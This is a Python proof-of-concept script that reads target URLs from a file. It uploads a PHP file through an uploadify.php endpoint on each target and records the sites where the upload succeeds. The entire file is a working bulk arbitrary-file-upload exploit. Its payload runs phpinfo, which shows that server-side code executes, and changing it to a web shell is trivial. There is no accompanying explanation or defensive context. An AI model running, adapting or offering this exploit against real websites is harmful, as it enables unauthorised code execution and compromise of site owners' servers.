import requests
import hashlib

def main():
    target_file = open("target.txt", "r")
    targets = target_file.readlines()
    target_file.close()
    for target in targets:
        poc(target.replace('\n', '').strip())
        
def calculate_md5(text):
    md5_hash = hashlib.md5(text.encode()).hexdigest()
    return md5_hash[:8]

def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Referer": target
    }
    filename = calculate_md5(target) + ".php"
    files = {
        ("Filedata", (filename, '''<?php phpinfo(); ?>''', "application/octet-stream")),
        ("file", ("", "", "application/octet-stream"))
    }
    print(f"[*]Now try: {target}")
    try:
        response = requests.post(target + "/inc/jquery/uploadify/uploadify.php", headers=headers, files=files, allow_redirects=False, timeout=5)
        if response.text.isdigit() == True and response.status_code == 200:
            file_url = target + "/attachment/" + response.text + filename
            print(f"[+]Succeeded: {file_url}")
            f = open('hit.txt', 'a+')
            f.write(file_url + "\n")
            f.close()
        else:
            print(f"[-]{target} is not exploitable")
    except Exception as e:
        print(f"[-]{target} is not exploitable")

main()